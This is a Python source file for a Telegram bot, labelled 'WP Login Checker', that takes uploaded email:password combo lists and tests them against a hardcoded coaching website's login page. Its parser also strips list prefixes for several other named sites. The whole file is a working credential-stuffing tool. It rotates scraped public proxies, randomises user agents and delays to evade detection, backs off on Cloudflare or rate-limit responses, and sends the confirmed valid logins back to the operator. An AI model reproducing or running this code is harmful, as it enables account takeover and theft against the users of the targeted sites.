#!/usr/bin/env python3
"""
WP Login Checker Bot - Debug Version
"""

import os
import sys
import logging
import threading
import re
import random
import time
from datetime import datetime

# Create Event Loop BEFORE Any Imports
import asyncio

try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

import requests
from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message

# ============ CONFIG ============

API_ID = int(os.environ.get("API_ID", "0") or "0")
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMINS = os.environ.get("ADMINS", "")
LEGACY_PROXIES = os.environ.get("PROXIES", "")
MIN_DELAY = float(os.environ.get("MIN_DELAY", "20"))
MAX_DELAY = float(os.environ.get("MAX_DELAY", "50"))

ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# ============ ERROR LOGGING ============

_ERROR_LOG = []

def log_error(url, user, error_type, details):
    """Log errors for debugging"""
    _ERROR_LOG.append({
        'timestamp': datetime.now().isoformat(),
        'url': url,
        'user': user[:20] + '...' if len(user) > 20 else user,
        'error_type': error_type,
        'details': details
    })
    if len(_ERROR_LOG) > 50:
        _ERROR_LOG.pop(0)

def save_error_log(filename="error_debug.txt"):
    """Save error log to file"""
    if not _ERROR_LOG:
        return None
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write("ERROR DEBUG LOG\n")
        f.write(f"Generated: {datetime.now()}\n")
        f.write(f"Total Errors: {len(_ERROR_LOG)}\n")
        f.write("=" * 60 + "\n\n")
        
        for i, err in enumerate(_ERROR_LOG, 1):
            f.write(f"\n--- Error #{i} ---\n")
            f.write(f"Time: {err['timestamp']}\n")
            f.write(f"URL: {err['url']}\n")
            f.write(f"User: {err['user']}\n")
            f.write(f"Type: {err['error_type']}\n")
            f.write(f"Details: {err['details']}\n")
    
    return filename

# ============ FLASK SERVER ============

flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "✅ Bot is running", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# ============ PROXY MANAGEMENT ============

_MEMORY_PROXIES = []
_LAST_REFRESH = None

def fetch_proxies_sync():
    """Fetch proxies synchronously"""
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&limit=100",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    ]
    
    all_proxies = []
    
    for url in sources:
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                for line in resp.text.strip().split('\n'):
                    line = line.strip()
                    if ':' in line and not line.startswith('#'):
                        proxy = line.split('@')[-1] if '@' in line else line
                        if not proxy.startswith('http'):
                            proxy = f"http://{proxy}"
                        try:
                            ip, port = proxy.replace('http://', '').split(':')
                            if ip.count('.') == 3 and port.isdigit():
                                all_proxies.append(proxy)
                        except:
                            pass
        except Exception as e:
            logger.debug(f"Source failed: {e}")
    
    seen = set()
    unique = []
    for p in all_proxies:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    
    logger.info(f"Fetched {len(unique)} unique proxies")
    return unique[:100]

def check_proxy_simple(proxy):
    """Simple proxy check"""
    try:
        proxies = {'http': proxy, 'https': proxy}
        resp = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=10)
        return resp.status_code == 200
    except:
        return False

def refresh_proxies_sync():
    """Refresh proxies"""
    global _MEMORY_PROXIES, _LAST_REFRESH
    
    logger.info("=" * 40)
    logger.info("🔄 Refreshing proxies...")
    
    try:
        all_proxies = fetch_proxies_sync()
        if len(all_proxies) < 20:
            logger.warning("Too few proxies fetched")
            return False
        
        logger.info(f"🔍 Testing {min(30, len(all_proxies))} proxies...")
        working = []
        
        for proxy in all_proxies[:30]:
            if check_proxy_simple(proxy):
                working.append(proxy)
        
        if len(working) < 3:
            logger.warning(f"Only {len(working)} working, using unverified")
            _MEMORY_PROXIES = all_proxies[:50]
            _LAST_REFRESH = datetime.now()
            logger.info(f"Using {len(_MEMORY_PROXIES)} unverified proxies")
            return True
        
        _MEMORY_PROXIES = working
        _LAST_REFRESH = datetime.now()
        
        logger.info(f"✅ {len(working)} working proxies ready")
        return True
        
    except Exception as e:
        logger.error(f"❌ Refresh failed: {e}")
        return False

def get_random_proxy():
    """Get random working proxy"""
    if _MEMORY_PROXIES:
        return random.choice(_MEMORY_PROXIES)
    if LEGACY_PROXIES:
        legacy = [p.strip() for p in LEGACY_PROXIES.split(',') if p.strip()]
        return random.choice(legacy) if legacy else None
    return None

def auto_refresh_loop():
    """Background thread for auto-refresh"""
    refresh_proxies_sync()
    while True:
        time.sleep(1800)
        refresh_proxies_sync()

threading.Thread(target=auto_refresh_loop, daemon=True).start()

# ============ ANTI-DETECTION ============

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
]

FAILED_DOMAINS = {}

def get_headers():
    ua = random.choice(USER_AGENTS)
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
    }

def mark_failed(domain):
    FAILED_DOMAINS[domain] = time.time()

def is_cooled(domain):
    if domain in FAILED_DOMAINS:
        return time.time() - FAILED_DOMAINS[domain] < 300
    return False

# ============ PARSER ============

def parse_line(line):
    """Smart parser with fixed URL"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    LOGIN_URL = "https://coaching.miteshkhatri.com/login"
    
    try:
        url_patterns = [
            'https://coaching.miteshkhatri.com/password/edit:',
            'https://coaching.miteshkhatri.com/password:',
            'https://coaching.miteshkhatri.com/login:',
            'https://coaching.miteshkhatri.com/sign_up:',
            'https://coaching.miteshkhatri.com/:',
            'https://coaching.miteshkhatri.com:',
            'http://coaching.miteshkhatri.com/login:',
            'http://coaching.miteshkhatri.com:',
            'coaching.miteshkhatri.com/login:',
            'coaching.miteshkhatri.com/password/edit:',
            'coaching.miteshkhatri.com/password:',
            'coaching.miteshkhatri.com/sign_up:',
            'coaching.miteshkhatri.com:',
            'community.miteshkhatri.com/sign_up:',
            'community.miteshkhatri.com/:',
            'community.miteshkhatri.com:',
            'partners.miteshkhatri.com:',
            'https://community.miteshkhatri.com/sign_up:',
            'https://community.miteshkhatri.com/:',
            'https://community.miteshkhatri.com:',
            'https://www.duroflexworld.com:',
            'https://app.joinsuperset.com:',
            'https://app.houseparty.com:',
            'https://citymall.com.mm/citymart_en/customer/account/create:',
        ]
        
        cleaned = line
        
        for pattern in url_patterns:
            if cleaned.startswith(pattern):
                cleaned = cleaned[len(pattern):]
                break
        
        parts = cleaned.split(':')
        if len(parts) >= 3:
            last = parts[-1].lower()
            if 'miteshkhatri' in last or last.startswith('http'):
                cleaned = ':'.join(parts[:-1])
        
        if not cleaned or cleaned == ':':
            return None
        
        if cleaned.count(':') == 1:
            username, password = cleaned.split(':')
        else:
            if '@' in cleaned:
                at_pos = cleaned.find('@')
                colon_pos = cleaned.find(':', at_pos)
                if colon_pos != -1:
                    username = cleaned[:colon_pos]
                    password = cleaned[colon_pos + 1:]
                else:
                    username, password = cleaned.split(':', 1)
            else:
                username, password = cleaned.split(':', 1)
        
        username = username.strip().rstrip('/').rstrip(':')
        password = password.strip().rstrip('/').rstrip(':')
        
        if not username or not password:
            return None
        if username.lower() == 'unknown':
            return None
        if username in ['loa', 'http', 'https']:
            return None
        if 'miteshkhatri' in username or 'http' in username:
            return None
        if 'miteshkhatri' in password or password.startswith('http'):
            return None
        if len(username) < 2:
            return None
        
        return (LOGIN_URL, username, password)
        
    except Exception as e:
        logger.debug(f"Parse error: {e}")
        return None

# ============ LOGIN CHECKER WITH DEBUG ============

def check_login_sync(url, user, pwd):
    """Custom login checker with detailed debug logging"""
    domain = url.split('/')[2]
    
    if is_cooled(domain):
        time.sleep(60)
    
    proxy = get_random_proxy()
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    
    logger.info(f"Checking {user[:25]}... Proxy: {'Yes' if proxy else 'No'}")
    
    time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
    
    session = requests.Session()
    headers = get_headers()
    
    try:
        # GET login page
        logger.info(f"GET {url}")
        
        try:
            resp = session.get(url, headers=headers, timeout=20, proxies=proxies)
        except Exception as e:
            log_error(url, user, "GET_FAILED", f"Error: {str(e)}")
            return None, f'GET failed: {str(e)[:50]}'
        
        logger.info(f"GET Status: {resp.status_code}, Size: {len(resp.text)} bytes")
        
        if resp.status_code == 403:
            mark_failed(domain)
            log_error(url, user, "403_BLOCKED", f"Status {resp.status_code}")
            return None, '403 Blocked'
        
        if resp.status_code == 429:
            mark_failed(domain)
            log_error(url, user, "429_RATE_LIMIT", f"Status {resp.status_code}")
            return None, '429 Rate limited'
        
        if resp.status_code != 200:
            log_error(url, user, "BAD_STATUS", f"Status {resp.status_code}")
            return None, f'HTTP {resp.status_code}'
        
        # Check for cloudflare/security
        if any(x in resp.text for x in ['cf-ray', '__cf_bm', 'Just a moment', 'Checking your browser']):
            mark_failed(domain)
            log_error(url, user, "CLOUDFLARE", "Security check detected")
            return None, 'Cloudflare/security check'
        
        # Log page content
        page_sample = resp.text[:600].replace('\n', ' ').replace('\r', '')
        logger.info(f"Page: {page_sample[:200]}...")
        
        # Check for form fields
        has_email_field = 'name="email"' in resp.text.lower() or 'type="email"' in resp.text.lower()
        has_password_field = 'name="password"' in resp.text.lower() or 'type="password"' in resp.text.lower()
        logger.info(f"Form fields - Email: {has_email_field}, Password: {has_password_field}")
        
        # Try multiple payload variants
        payloads = [
            {'email': user, 'password': pwd, 'remember': 'on'},
            {'email': user, 'password': pwd},
            {'username': user, 'password': pwd},
            {'user': user, 'pass': pwd},
        ]
        
        # Extract hidden fields
        hidden_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']'
        hidden_fields = {}
        for match in re.finditer(hidden_pattern, resp.text, re.I):
            name, val = match.groups()
            if name and name not in ['email', 'password', 'remember']:
                hidden_fields[name] = val
        
        logger.info(f"Hidden fields: {list(hidden_fields.keys())}")
        
        for p in payloads:
            p.update(hidden_fields)
        
        post_headers = headers.copy()
        post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        post_headers['Referer'] = url
        post_headers['Origin'] = f"https://{domain}"
        
        last_response_info = None
        
        for i, payload in enumerate(payloads):
            try:
                time.sleep(random.uniform(2, 5))
                
                logger.info(f"POST attempt {i+1} with fields: {list(payload.keys())}")
                
                resp = session.post(
                    url,
                    data=payload,
                    headers=post_headers,
                    timeout=20,
                    proxies=proxies,
                    allow_redirects=True
                )
                
                final_url = resp.url
                text = resp.text.lower()
                cookies = [c.name for c in session.cookies]
                
                last_response_info = {
                    'status': resp.status_code,
                    'final_url': final_url,
                    'cookies': cookies,
                    'sample': resp.text[:500]
                }
                
                logger.info(f"POST Status: {resp.status_code}, Final URL: {final_url[:60]}")
                logger.info(f"Cookies set: {cookies}")
                
                # SUCCESS CHECKS
                success_indicators = [
                    'dashboard' in text,
                    'profile' in text,
                    'logout' in text or 'log out' in text,
                    'welcome' in text,
                    'my account' in text,
                    'account' in text and 'settings' in text,
                    '/dashboard' in final_url,
                    '/profile' in final_url,
                    '/home' in final_url and 'login' not in final_url,
                    'courses' in text and 'login' not in final_url,
                ]
                
                session_cookies = [c for c in cookies if any(x in c.lower() for x in ['session', 'auth', 'token', 'user', 'login', 'id', 'sess'])]
                
                failure_indicators = [
                    'incorrect' in text,
                    'invalid' in text,
                    'wrong' in text,
                    'error' in text and 'login' in text,
                    'failed' in text,
                    'authentication failed' in text,
                    'invalid credentials' in text,
                    'wrong password' in text,
                    'user not found' in text,
                ]
                
                on_login_page = 'login' in final_url.lower() or 'sign in' in text
                
                has_success = any(success_indicators)
                has_failure = any(failure_indicators)
                
                logger.info(f"Success: {has_success}, Failure: {has_failure}, On login: {on_login_page}, Session cookies: {len(session_cookies)}")
                
                if has_success and not has_failure:
                    return True, 'Login successful'
                
                if has_failure:
                    return False, 'Invalid credentials'
                
                if not on_login_page and len(session_cookies) > 0:
                    return True, 'Redirected with session cookie'
                
                # If still on login page but no failure message, might be wrong fields
                if i == len(payloads) - 1:
                    response_detail = f"URL: {final_url}, Cookies: {len(cookies)}, Sample: {resp.text[:300].replace(chr(10), ' ')}"
                    log_error(url, user, "UNCLEAR_RESULT", response_detail)
                
                if i < len(payloads) - 1:
                    session.cookies.clear()
                    
            except Exception as e:
                logger.error(f"POST attempt {i+1} failed: {e}")
                if i == len(payloads) - 1:
                    log_error(url, user, "POST_FAILED", f"All attempts failed. Last: {str(e)}")
                continue
        
        log_error(url, user, "ALL_FAILED", f"Last response: {last_response_info}")
        return None, 'Could not determine result'
        
    except requests.Timeout:
        log_error(url, user, "TIMEOUT", "Request timeout")
        return None, 'Timeout'
    except Exception as e:
        log_error(url, user, "EXCEPTION", str(e))
        return None, str(e)[:50]

# ============ BATCH PROCESSING ============

def process_batch_sync(credentials, progress_callback=None):
    """Process batch synchronously"""
    results = {'valid': [], 'invalid': [], 'error': [], 'total': len(credentials)}
    
    for i, (url, user, pwd) in enumerate(credentials):
        if progress_callback:
            progress_callback(i + 1, len(credentials), user)
        
        if i > 0:
            time.sleep(random.uniform(5, 10))
        
        valid, reason = check_login_sync(url, user, pwd)
        line = f"{url}:{user}:{pwd}"
        
        if valid is True:
            results['valid'].append({'line': line, 'reason': reason})
        elif valid is False:
            results['invalid'].append({'line': line, 'reason': reason})
        else:
            results['error'].append({'line': line, 'reason': reason})
    
    return results

# ============ TELEGRAM BOT ============

bot = Client(
    "wp_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True
)

@bot.on_message(filters.command("start"))
async def cmd_start(c, m):
    uid = m.from_user.id
    await m.reply(f"""👋 **WP Checker Bot**

**Your ID:** `{uid}`

**Commands:**
• `/check email password` - Single check
• `/checkfile` - Upload .txt file
• `/status` - Bot status
• `/refresh` - Refresh proxies

**Format:** `email:password`

Add `{uid}` to ADMINS env var.""")

@bot.on_message(filters.command("status"))
async def cmd_status(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    lr = _LAST_REFRESH
    await m.reply(f"""📊 **Status**

🤖 Bot: **Online**
📡 Proxies: **{len(_MEMORY_PROXIES)}** working
⏱️ Delay: **{MIN_DELAY}s - {MAX_DELAY}s**
🕐 Last refresh: **{lr.strftime('%H:%M:%S') if lr else 'Never'}**

**Protection:**
✅ Proxy rotation
✅ Random delays  
✅ Domain cooldown""")

@bot.on_message(filters.command("refresh"))
async def cmd_refresh(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    msg = await m.reply("🔄 Refreshing proxies...")
    
    def do_refresh():
        return refresh_proxies_sync()
    
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, do_refresh)
    
    if result:
        await msg.edit(f"✅ Refreshed! **{len(_MEMORY_PROXIES)}** proxies ready")
    else:
        await msg.edit("⚠️ Refresh failed")

@bot.on_message(filters.command("check"))
async def cmd_check(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    args = m.text.split()[1:]
    if len(args) < 2:
        return await m.reply("❌ Usage: `/check email password`")
    
    url = "https://coaching.miteshkhatri.com/login"
    user = args[0]
    pwd = ' '.join(args[1:])
    
    msg = await m.reply(f"⏳ Checking `{user[:30]}...`")
    
    def do_check():
        return check_login_sync(url, user, pwd)
    
    try:
        loop = asyncio.get_event_loop()
        valid, reason = await loop.run_in_executor(None, do_check)
        
        if valid is True:
            text = f"""✅ **VALID**

👤 `{user}`
🔑 `{pwd}`
📋 {reason}"""
        elif valid is False:
            text = f"""❌ **INVALID**

👤 `{user}`
📋 {reason}"""
        else:
            text = f"""⚠️ **ERROR**

👤 `{user}`
❌ {reason}"""
        
        await msg.edit(text)
    except Exception as e:
        await msg.edit(f"❌ Error: `{e}`")

@bot.on_message(filters.document & filters.private)
async def handle_file(c, m):
    """Handle uploaded credential files with debug"""
    global _ERROR_LOG
    _ERROR_LOG = []  # Clear previous errors
    
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    file_name = m.document.file_name or "unknown"
    if not file_name.endswith('.txt'):
        return await m.reply("❌ Only .txt files allowed")
    
    file_size = m.document.file_size or 0
    if file_size == 0:
        return await m.reply("❌ File is empty (0 bytes)")
    if file_size > 10 * 1024 * 1024:
        return await m.reply("❌ File too large! Max 10MB")
    
    msg = await m.reply(f"📥 Downloading {file_size} bytes...")
    
    try:
        download_path = await m.download()
        
        if not download_path or not os.path.exists(download_path):
            return await msg.edit("❌ Download failed")
        
        actual_size = os.path.getsize(download_path)
        if actual_size == 0:
            os.remove(download_path)
            return await msg.edit("❌ Downloaded file is empty")
        
        await msg.edit(f"📖 Reading {actual_size} bytes...")
        
        content = None
        encodings = ['utf-8', 'utf-8-sig', 'latin-1', 'cp1252']
        
        for encoding in encodings:
            try:
                with open(download_path, 'r', encoding=encoding, errors='ignore') as f:
                    content = f.read()
                    if content and content.strip():
                        break
            except:
                continue
        
        try:
            os.remove(download_path)
        except:
            pass
        
        if not content or not content.strip():
            return await msg.edit("❌ File is empty or unreadable")
        
        lines = [l.strip() for l in content.split('\n') if l.strip()]
        
        creds = []
        for line in lines:
            parsed = parse_line(line)
            if parsed:
                creds.append(parsed)
        
        if not creds:
            return await msg.edit(
                f"❌ No valid credentials found!\n\n"
                f"📄 Checked {len(lines)} lines"
            )
        
        total = len(creds)
        eta = (total * 35) // 60
        
        await msg.edit(
            f"✅ Found **{total}** valid credentials\n"
            f"⏱️ ETA: ~{eta} minutes\n\n"
            f"🔍 Starting checks..."
        )
        
        def do_batch():
            return process_batch_sync(creds)
        
        loop = asyncio.get_event_loop()
        start = time.time()
        results = await loop.run_in_executor(None, do_batch)
        elapsed = time.time() - start
        
        # Save valid results
        valid_file = f"valid_{datetime.now():%Y%m%d_%H%M%S}.txt"
        valid_count = len(results['valid'])
        
        with open(valid_file, 'w', encoding='utf-8') as f:
            for item in results['valid']:
                f.write(item['line'] + '\n')
        
        # Save error debug file
        error_file = None
        if len(_ERROR_LOG) > 0:
            error_file = save_error_log(f"errors_{datetime.now():%Y%m%d_%H%M%S}.txt")
        
        # Summary
        summary = (
            f"✅ **Complete!**\n\n"
            f"📊 Total: **{total}**\n"
            f"✅ Valid: **{valid_count}**\n"
            f"❌ Invalid: **{len(results['invalid'])}**\n"
            f"⚠️ Errors: **{len(results['error'])}**\n"
            f"⏱️ Time: **{elapsed//60}m {elapsed%60:.0f}s**"
        )
        
        await msg.edit(summary)
        
        # Send valid file
        if valid_count > 0:
            await m.reply_document(valid_file, caption=f"✅ **{valid_count}** valid")
        
        # Send error debug file
        if error_file and os.path.exists(error_file):
            await m.reply_document(error_file, caption=f"⚠️ Debug: **{len(_ERROR_LOG)}** errors logged")
            os.remove(error_file)
        
        # Cleanup
        try:
            os.remove(valid_file)
        except:
            pass
        
    except Exception as e:
        logger.error(f"File error: {e}", exc_info=True)
        await msg.edit(f"❌ Error: `{str(e)[:200]}`")

# ============ MAIN ============

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("🌐 Flask started")
    
    time.sleep(3)
    
    logger.info("🤖 Starting bot...")
    bot.run()
